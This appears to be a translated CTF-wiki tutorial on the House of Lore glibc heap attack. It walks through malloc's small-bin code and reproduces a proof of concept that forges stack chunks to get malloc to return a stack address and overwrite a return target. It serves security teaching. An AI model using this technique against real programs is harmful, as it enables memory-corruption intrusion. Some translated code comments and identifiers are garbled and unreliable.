[EN](./house_of_lore.md) | [ZH](./house_of_lore-zh.md)
# House of Lore



## Overview


The House of Lore attack is closely related to the mechanism of Small Bin in Glibc heap management.


House of Lore can modify the memory of any address by assigning chunks of any specified location.


House of Lore takes advantage of the need to control the bk pointer of Small Bin Chunk and control the fd pointer of the chunk at the specified location.


## Fundamental


If at malloc, the requested memory block is in the range of small bin, then the execution process is as follows


```c

    /*

       If a small request, check regular bin.  Since these "smallbins"

       hold one size each, no searching within bins is necessary.

       (For a large request, we need to wait until unsorted chunks are

       processed to find best fit. But for small ones, fits are exact

       anyway, so we can check now, which is faster.)

     */



    if (in_smallbin_range(nb)) {

/ / Get the index of the small bin
        idx = smallbin_index(nb);

/ / Get the corresponding chunk pointer in the small bin
bin = bin_at (av, idx);
// First execute victim= last(bin) to get the last chunk of the small bin
// If victim = bin , then the bin is empty.
// If they are not equal, then there will be two cases
        if ((victim = last(bin)) != bin) {

// In the first case, the small bin has not yet been initialized.
            if (victim == 0) /* initialization check */

// Perform initialization to merge chunks in fast bins
malloc_consolidate (of);
// In the second case, there is a free chunk in the small bin
            else {

// Get the second-to-last chunk in the small bin.
                bck = victim->bk;

// Check if bck-&gt;fd is victim, prevent forgery
                if (__glibc_unlikely(bck->fd != victim)) {

                    errstr = "malloc(): smallbin double linked list corrupted";

                    goto errout;

                }

/ / Set the corresponding inuse bit of victim
                set_inuse_bit_at_offset(victim, nb);

/ / Modify the small bin list, take the last chunk of the small bin
bin-&gt; bk = bck;
                bck->fd = bin;

// If it is not main_arena, set the corresponding flag
                if (av != &main_arena) set_non_main_arena(victim);

// Detailed inspection
check_malloced_chunk (off, victim, nb);
// Convert the requested chunk to the corresponding mem state
                void *p = chunk2mem(victim);

// If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff
                alloc_perturb(p, bytes);

                return p;

            }

        }

    }

```



We can see from this part below


```c

// Get the second-to-last chunk in the small bin.
                bck = victim->bk;

// Check if bck-&gt;fd is victim, prevent forgery
                if (__glibc_unlikely(bck->fd != victim)) {

                    errstr = "malloc(): smallbin double linked list corrupted";

                    goto errout;

                }

/ / Set the corresponding inuse bit of victim
                set_inuse_bit_at_offset(victim, nb);

/ / Modify the small bin list, take the last chunk of the small bin
bin-&gt; bk = bck;
                bck->fd = bin;

```



If we can modify the bk of the last chunk of the small bin to specify the fake chunk of the memory address, and at the same time satisfy the detection of bck-&gt;fd != victim, then we can make the bk of the small bin just construct for us. Fake chunk. In other words, the next time we apply for the small bin, we will assign the fake chunk to the specified location.


## Sample Code


```c

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <stdint.h>



void jackpot(){ puts("Nice jump d00d"); exit(0); }



int main(int argc, char * argv[]){





  intptr_t* stack_buffer_1[4] = {0};

  intptr_t* stack_buffer_2[3] = {0};



  fprintf(stderr, "\nWelcome to the House of Lore\n");

  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");

  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");



  fprintf(stderr, "Allocating the victim chunk\n");

  intptr_t *victim = malloc(100);

  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);



  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk

  intptr_t *victim_chunk = victim-2;



  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);

  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);



  fprintf(stderr, "Create a fake chunk on the stack");

  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"

         "in second to the last malloc, which putting stack address on smallbin list\n");

  stack_buffer_1[0] = 0;

  stack_buffer_1[1] = 0;

  stack_buffer_1[2] = victim_chunk;



  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "

         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "

         "chunk on stack");

  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;

  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  

  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");

  void *p5 = malloc(1000);

  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);





  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);

  free((void*)victim);



  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");

  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);

  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);



  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");

  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);



  void *p2 = malloc(1200);

  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);



  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");

  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);

  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);



  //------------VULNERABILITY-----------



  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");



  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack



  //------------------------------------



  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");

  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");



  void *p3 = malloc(100);





  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");

  char *p4 = malloc(100);

  fprintf(stderr, "p4 = malloc(100)\n");



  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",

         stack_buffer_2[2]);



  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack

  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode

  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

}

```



The above code has been made very clear and will not be explained.


** But what needs to be noted is: **


1. `void *p5 = malloc(1000);` is to prevent merge with top_chunk after victim_chunk.


2. `free((void*)victim)`, victim will be put into the unsort bin, and if the size of the next allocation is larger than this, the corresponding size will be allocated from the top chunk, and the chunk will be Remove the link to the appropriate bin. If it is smaller than this (equal returns directly), the corresponding size is cut off from the chunk, and the corresponding chunk is returned, and the rest becomes the last reminder chunk, or there is an unsorted bin.


## references


- [https://github.com/shellphish/how2heap/blob/master/house_of_lore.c](https://github.com/shellphish/how2heap/blob/master/house_of_lore.c)